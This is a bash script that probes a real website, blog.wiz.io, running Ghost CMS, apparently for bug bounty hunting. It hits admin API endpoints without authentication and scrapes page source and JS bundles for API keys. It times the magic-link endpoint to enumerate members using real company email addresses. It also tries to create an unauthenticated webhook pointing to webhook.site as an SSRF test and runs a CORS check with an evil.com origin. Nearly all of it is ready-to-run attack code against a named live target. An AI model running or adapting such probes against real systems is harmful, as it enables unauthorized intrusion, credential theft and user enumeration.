#!/usr/bin/env bash
# blog.wiz.io — Ghost CMS deep probe
# Looks for: exposed Admin API, Content API key leak, member enum, admin panel
# Run on Pi: bash scripts/blog-ghost-probe.sh 2>&1 | tee ~/blog-ghost-output.txt

set -euo pipefail
HOST="https://blog.wiz.io"
UA="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/125.0 Safari/537.36"
OUT="$HOME/bug-bounty-hunting-/results/wiz.io/evidence/blog-ghost"
mkdir -p "$OUT"

c() { curl -sk --connect-timeout 10 -A "$UA" "$@"; }
ci() { curl -sI --connect-timeout 10 -A "$UA" "$@"; }

echo "══════════════════════════════════════"
echo "Phase A — Version fingerprint"
echo "══════════════════════════════════════"
ci "${HOST}/" | tee "$OUT/headers-root.txt" | grep -i "ghost\|x-powered\|server\|x-cache\|vary"

echo ""
echo "══════════════════════════════════════"
echo "Phase B — Ghost Admin API exposure"
echo "══════════════════════════════════════"
for path in \
  "/ghost/" \
  "/ghost/api/admin/site/" \
  "/ghost/api/v3/admin/site/" \
  "/ghost/api/v4/admin/site/" \
  "/ghost/api/v5.0/admin/site/" \
  "/ghost/api/admin/users/" \
  "/ghost/api/admin/posts/" \
  "/ghost/api/admin/settings/"; do
  code=$(curl -so /dev/null -w "%{http_code}" --connect-timeout 8 -A "$UA" "${HOST}${path}")
  body=$(c "${HOST}${path}" | head -c 200)
  echo "${code}  ${path}  ${body:0:80}"
done

echo ""
echo "══════════════════════════════════════"
echo "Phase C — Content API key extraction"
echo "══════════════════════════════════════"
echo "=== Checking page source for API key ==="
PAGE=$(c "${HOST}/")
echo "$PAGE" | grep -oE '[a-f0-9]{26}' | sort -u | head -10
echo "$PAGE" | grep -oEi '(content.?api.?key|apiKey|ghost.?key|key:)[^"]*"[^"]{10,40}"' | head -10

echo ""
echo "=== Ghost SDK JS ==="
for sdk_path in "/public/ghost-sdk.min.js" "/public/ghost-sdk.js" "/assets/built/ghost-sdk.min.js"; do
  sdk=$(c "${HOST}${sdk_path}" | head -c 500)
  if [ -n "$sdk" ] && [[ "$sdk" != *"Not Found"* ]]; then
    echo "Found at ${sdk_path}:"
    echo "$sdk" | grep -oE 'key:[^,}]{1,50}' | head -5
  fi
done

echo ""
echo "=== JS bundles (look for embedded keys) ==="
JS_URLS=$(c "${HOST}/" | grep -oE 'src="[^"]+\.js[^"]*"' | sed 's/src="//;s/"//')
echo "Found JS URLs:" && echo "$JS_URLS" | head -5
FIRST_JS=$(echo "$JS_URLS" | head -1)
if [ -n "$FIRST_JS" ]; then
  echo "Scanning first bundle for keys..."
  c "${HOST}${FIRST_JS}" | grep -oEi '(content_api_key|contentApiKey|key)[\s]*[:=][\s]*["'"'"'][a-f0-9]{24,}["'"'"']' | head -10
fi

echo ""
echo "══════════════════════════════════════"
echo "Phase D — Ghost Content API (no key)"
echo "══════════════════════════════════════"
for ep in \
  "/ghost/api/content/posts/" \
  "/ghost/api/v3/content/posts/" \
  "/ghost/api/v4/content/posts/" \
  "/ghost/api/v5.0/content/posts/" \
  "/ghost/api/content/authors/" \
  "/ghost/api/content/tags/"; do
  code=$(curl -so /dev/null -w "%{http_code}" --connect-timeout 8 -A "$UA" "${HOST}${ep}")
  echo "${code}  ${ep}"
done

echo ""
echo "══════════════════════════════════════"
echo "Phase E — Ghost members/subscription"
echo "══════════════════════════════════════"
echo "=== Members site API ==="
c "${HOST}/members/api/site/" | head -c 400

echo ""
echo "=== Signup endpoint (should exist if members enabled) ==="
code=$(curl -so /dev/null -w "%{http_code}" --connect-timeout 8 -A "$UA" -X POST \
  "${HOST}/members/api/send-magic-link/" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@example.com","emailType":"signup"}')
echo "POST /members/api/send-magic-link: ${code}"

echo ""
echo "=== Member email enumeration (timing-based) ==="
for email in "security@wiz.io" "admin@wiz.io" "nonexistent_zzz_@wiz.io"; do
  t1=$(date +%s%3N)
  c -X POST "${HOST}/members/api/send-magic-link/" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"${email}\",\"emailType\":\"signup\"}" > /dev/null 2>&1
  t2=$(date +%s%3N)
  echo "  ${email}: $((t2-t1))ms"
done

echo ""
echo "══════════════════════════════════════"
echo "Phase F — Ghost SSRF via webhooks"
echo "══════════════════════════════════════"
echo "=== Try unauthenticated webhook create ==="
code=$(curl -so /dev/null -w "%{http_code}" --connect-timeout 8 -A "$UA" \
  -X POST "${HOST}/ghost/api/admin/webhooks/" \
  -H "Content-Type: application/json" \
  -d '{"webhooks":[{"event":"post.added","target_url":"https://webhook.site/test"}]}')
echo "POST /ghost/api/admin/webhooks/ (no auth): ${code}"

echo ""
echo "══════════════════════════════════════"
echo "Phase G — Integrations / OAuth"
echo "══════════════════════════════════════"
for path in \
  "/ghost/api/admin/integrations/" \
  "/ghost/api/admin/config/" \
  "/ghost/api/admin/authentication/" \
  "/ghost/oidc/" \
  "/ghost/oauth/"; do
  code=$(curl -so /dev/null -w "%{http_code}" --connect-timeout 8 -A "$UA" "${HOST}${path}")
  echo "${code}  ${path}"
done

echo ""
echo "══════════════════════════════════════"
echo "Phase H — CORS on content API"
echo "══════════════════════════════════════"
resp=$(curl -sk --connect-timeout 8 -A "$UA" \
  -H "Origin: https://evil.com" \
  -I "${HOST}/ghost/api/content/posts/")
echo "$resp" | grep -i "access-control\|vary\|cors"

echo ""
echo "=== Output saved to $OUT/ ==="
ci "${HOST}/" > "$OUT/headers-root.txt"
c "${HOST}/" > "$OUT/body-root.html"
echo "Done."
